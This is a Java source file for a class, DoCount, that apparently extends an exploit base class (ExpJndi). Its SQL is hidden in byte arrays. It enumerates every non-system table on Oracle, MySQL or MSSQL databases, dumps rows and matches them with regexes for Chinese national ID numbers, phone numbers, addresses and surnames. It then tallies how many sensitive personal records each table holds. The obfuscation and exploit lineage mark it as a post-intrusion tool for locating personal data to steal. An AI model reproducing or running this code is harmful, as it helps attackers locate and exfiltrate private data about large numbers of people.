package util;

import java.sql.DatabaseMetaData;
import java.util.ArrayList;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DoCount extends ExpJndi {
   String[] aC;
   String g_szS;

   public DoCount() {
      this.aC = new String[]{new String(new byte[]{115, 101, 108, 101, 99, 116, 32, 79, 87, 78, 69, 82, 44, 84, 65, 66, 76, 69, 95, 78, 65, 77, 69, 44, 78, 85, 77, 95, 82, 79, 87, 83, 32, 102, 114, 111, 109, 32, 97, 108, 108, 95, 116, 97, 98, 108, 101, 115, 32, 119, 104, 101, 114, 101, 32, 32, 111, 119, 110, 101, 114, 32, 110, 111, 116, 32, 105, 110, 32, 40, 39, 67, 72, 65, 78, 71, 69, 95, 79, 78, 95, 73, 78, 83, 84, 65, 76, 76, 39, 44, 39, 67, 84, 88, 83, 89, 83, 39, 44, 39, 68, 66, 83, 78, 77, 80, 39, 44, 39, 73, 78, 84, 69, 82, 78, 65, 76, 39, 44, 39, 76, 66, 65, 67, 83, 89, 83, 39, 44, 39, 77, 65, 78, 65, 71, 69, 82, 39, 44, 39, 77, 68, 83, 89, 83, 39, 44, 39, 77, 84, 82, 80, 87, 39, 44, 39, 77, 84, 83, 83, 89, 83, 39, 44, 39, 79, 68, 77, 39, 44, 39, 79, 68, 77, 95, 77, 84, 82, 39, 44, 39, 79, 76, 65, 80, 83, 89, 83, 39, 44, 39, 79, 82, 65, 67, 76, 69, 39, 44, 39, 79, 82, 68, 80, 76, 85, 71, 73, 78, 83, 39, 44, 39, 79, 82, 68, 83, 89, 83, 39, 44, 39, 79, 85, 84, 76, 78, 39, 44, 39, 83, 67, 79, 84, 84, 39, 44, 39, 83, 89, 83, 39, 44, 39, 83, 89, 83, 84, 69, 77, 39, 44, 39, 84, 73, 71, 69, 82, 39, 44, 39, 65, 81, 65, 68, 77, 39, 44, 39, 83, 89, 83, 77, 65, 78, 39, 41, 32, 97, 110, 100, 32, 78, 85, 77, 95, 82, 79, 87, 83, 32, 62, 32}) + this.nMinNum + new String(new byte[]{32, 111, 114, 100, 101, 114, 32, 98, 121, 32, 110, 117, 109, 95, 114, 111, 119, 115, 32, 100, 101, 115, 99}), new String(new byte[]{83, 69, 76, 69, 67, 84, 32, 84, 65, 66, 76, 69, 95, 83, 67, 72, 69, 77, 65, 32, 97, 115, 32, 79, 87, 78, 69, 82, 44, 84, 65, 66, 76, 69, 95, 78, 65, 77, 69, 44, 84, 65, 66, 76, 69, 95, 82, 79, 87, 83, 32, 97, 115, 32, 78, 85, 77, 95, 82, 79, 87, 83, 32, 70, 82, 79, 77, 32, 105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 95, 115, 99, 104, 101, 109, 97, 46, 116, 97, 98, 108, 101, 115, 32, 119, 104, 101, 114, 101, 32, 84, 65, 66, 76, 69, 95, 82, 79, 87, 83, 32, 62}) + this.nMinNum + new String(new byte[]{32, 111, 114, 100, 101, 114, 32, 98, 121, 32, 116, 97, 98, 108, 101, 95, 114, 111, 119, 115, 32, 100, 101, 115, 99}), new String(new byte[]{83, 69, 76, 69, 67, 84, 32, 65, 46, 78, 65, 77, 69, 32, 97, 115, 32, 84, 65, 66, 76, 69, 95, 78, 65, 77, 69, 32, 44, 66, 46, 82, 79, 87, 83, 32, 97, 115, 32, 78, 85, 77, 95, 82, 79, 87, 83, 32, 32, 70, 82, 79, 77, 32, 115, 121, 115, 111, 98, 106, 101, 99, 116, 115, 32, 32, 65, 32, 74, 79, 73, 78, 32, 115, 121, 115, 105, 110, 100, 101, 120, 101, 115, 32, 66, 32, 79, 78, 32, 65, 46, 105, 100, 32, 61, 32, 66, 46, 105, 100, 32, 87, 72, 69, 82, 69, 32, 65, 46, 120, 116, 121, 112, 101, 32, 61, 32, 39, 85, 39, 32, 65, 78, 68, 32, 66, 46, 105, 110, 100, 105, 100, 32, 73, 78, 40, 48, 44, 49, 41, 32, 97, 110, 100, 32, 66, 46, 82, 79, 87, 83, 32, 62, 32}) + this.nMinNum + new String(new byte[]{32, 111, 114, 100, 101, 114, 32, 66, 89, 32, 66, 46, 82, 79, 87, 83, 32, 68, 69, 83, 67})};
      this.g_szS = this.aC[0];
   }

   public void sdb() {
      try {
         if (this.oCon == null || this.oCon.isClosed()) {
            return;
         }

         DatabaseMetaData var1 = this.oCon.getMetaData();
         this.log("db info: " + (this.szDbbName = var1.getDatabaseProductName() + " " + var1.getDatabaseProductVersion()) + "\n");
         this.isOracle = -1 < this.szDbbName.toLowerCase().indexOf("oracle");
         this.isMysql = -1 < this.szDbbName.toLowerCase().indexOf("mysql");
         if (this.isMysql) {
            this.g_szS = this.aC[1];
         }

         this.isMssql = -1 < this.szDbbName.toLowerCase().indexOf("microsoft sql server");
         if (this.isMssql) {
            this.g_szS = this.aC[2];
         }
      } catch (Exception var2) {
      }

   }

   public void doCount() throws Exception {
      if (this.szDbbName.length() != 0 || this.o == System.out) {
         if (!this.bOne) {
            this.bOne = true;
            String var1 = "TABLE_NAME";
            this.lm = new ArrayList();
            this.log("\n" + this.g_szS + "\n");
            this.print("<table><tr><td>");
            this.bDoTb = true;
            String var2 = this.szColSplit;
            this.szColSplit = this.szCol;
            this.doSql(this.g_szS);
            this.print("</table>");
            this.szColSplit = var2;
            this.bDoTb = false;
            boolean var3 = false;
            int var31;
            if ((var31 = this.lm.size()) > 0) {
               Map var4 = null;
               String var6 = "\\b([0-9]{6}(19|20)[0-9]{9}[0-9xX])\\b";
               String var7 = "\\b(1[34578][0123456789][0-9]{8})\\b";
               String var8 = "\\b[^\\t;,]{1,}(楼|栋|幢|号|路|弄|巷|街)[^\\n]{3,400}\\b";
               String var9 = "\\b\\s*(泽|土|达|仁|生|桑|修|则|呷|丹|格|洛|王|李|张|刘|陈|杨|黄|吴|赵|周|徐|孙|马|朱|胡|林|郭|何|高|罗|郑|梁|谢|宋|唐|许|邓|冯|韩|曹|曾|彭|萧|蔡|潘|田|董|袁|于|余|叶|蒋|杜|苏|魏|程|吕|丁|沈|任|姚|卢|傅|钟|姜|崔|谭|廖|范|汪|陆|金|石|戴|贾|韦|夏|邱|方|侯|邹|熊|孟|秦|白|江|阎|薛|尹|段|雷|黎|史|龙|陶|贺|顾|毛|郝|龚|邵|万|钱|严|赖|覃|洪|武|莫|孔|汤|向|常|温|康|施|文|牛|樊|葛|邢|安|齐|易|乔|伍|庞|颜|倪|庄|聂|章|鲁|岳|翟|殷|詹|申|欧|耿|关|兰|焦|俞|左|柳|甘|祝|包|宁|尚|符|舒|阮|柯|纪|梅|童|凌|毕|单|季|裴|霍|涂|成|苗|谷|盛|曲|翁|冉|骆|蓝|路|游|辛|靳|阳|管|柴|蒙|鲍|华|喻|祁|蒲|房|滕|屈|饶|解|牟|艾|尤|时|穆|农|司|卓|古|吉|缪|简|车|项|连|芦|麦|褚|娄|窦|戚|岑|景|党|宫|费|卜|冷|晏|席|卫|米|柏|宗|瞿|桂|全|佟|应|臧|闵|苟|邬|边|卞|姬|师|和|仇|栾|隋|商|刁|沙|荣|巫|寇|桑|郎|甄|丛|仲|虞|敖|巩|明|佘|池|查|麻|苑|迟|邝|官|封|谈|匡|鞠|惠|荆|乐|冀|郁|胥|南|班|储|原|栗|燕|楚|鄢|劳|谌|奚|皮|粟|冼|蔺|楼|盘|满|闻|位|厉|伊|仝|区|郜|海|阚|花|权|强|帅|屠|豆|朴|盖|练|廉|禹|井|祖|漆|巴|丰|支|卿|国|狄|平|计|索|宣|晋|相|初|门|云|容|敬|来|扈|晁|芮|都|普|阙|浦|戈|伏|鹿|薄|邸|雍|辜|羊|阿|乌|母|裘|亓|修|邰|赫|杭|况|那|宿|鲜|印|逯|隆|茹|诸|战|慕|危|玉|银|亢|嵇|公|哈|湛|宾|戎|勾|茅|利|於|呼|居|揭|干|但|尉|冶|斯|元|束|檀|衣|信|展|阴|昝|智|幸|奉|植|衡|富|尧|闭|由)[^\\t; ,]{2,20}\\b";
               String var10 = "0\\d{2,5}-\\d{7,10}";
               int var11 = 0;
               Pattern var12 = Pattern.compile(var6);
               Pattern var13 = Pattern.compile(var7);
               Pattern var14 = Pattern.compile(var8);
               Pattern var15 = Pattern.compile(var9);
               Pattern var16 = Pattern.compile(var10);
               String var23 = "";
               String var24 = "";
               String var25 = "";
               String var26 = "";
               boolean var27 = true;
               ArrayList var28 = new ArrayList();
               boolean var29 = false;

               for(int var30 = 0; var30 < var31; ++var30) {
                  var4 = (Map)this.lm.get(var30);
                  if (var4.get(var1) != null && var4.get("OWNER") != null) {
                     String var5 = this.getOneLine(new String(new byte[]{115, 101, 108, 101, 99, 116, 32, 42, 32, 102, 114, 111, 109, 32}) + (String)var4.get("OWNER") + "." + (String)var4.get(var1), true);
                     if (var5 != null && 18 < var5.length()) {
                        Matcher var17 = var12.matcher(var5);
                        Matcher var18 = var13.matcher(var5);
                        Matcher var19 = var14.matcher(var5);
                        Matcher var20 = var15.matcher(var5);
                        Matcher var21 = var16.matcher(var5);
                        if (this.bSy) {
                           var29 = var20 != null && var20.find() && (var18 != null && var18.find() || var21 != null && var21.find()) && (var17 != null && var17.find() || var19 != null && var19.find());
                        } else {
                           var29 = var20 != null && var20.find() && (var17 != null && var17.find() || var18 != null && var18.find() || var21 != null && var21.find() || var19 != null && var19.find());
                        }

                        if (var29) {
                           var26 = var26 + "\n表名:" + (String)var4.get("OWNER") + "." + (String)var4.get(var1) + "(" + (String)var4.get("NUM_ROWS") + ")\n" + var5 + "\n\n";
                           var11 += Integer.parseInt((String)var4.get("NUM_ROWS"));
                           var28.add((String)var4.get("OWNER") + "." + (String)var4.get(var1));
                           if (var27) {
                              var27 = false;
                              var24 = (String)var4.get("OWNER") + "." + (String)var4.get(var1);
                              var23 = this.szLstColsNames;
                           }

                           var25 = var25 + (String)var4.get("OWNER") + "." + (String)var4.get(var1) + "\t" + (String)var4.get("NUM_ROWS") + "\n";
                        }
                     }
                  }
               }

               this.print("\n敏感信息累计：" + var11 / 10000 + "万");
               this.print("\n敏感信息表分布：\n<table><tr><th>table<th>number<tr><td>" + var25.replaceAll("\t", "<td>").replaceAll("\n", "<tr><td>").replace("<td><tr>", "<tr>").replaceAll("<tr><td>$", "") + "</table>");
               this.print(var26);
            }

         }
      }
   }

   public boolean c() throws Exception {
      if (super.c() && (this.sZ == null || 5 > this.sZ.length())) {
         this.doCount();
      }

      return true;
   }
}
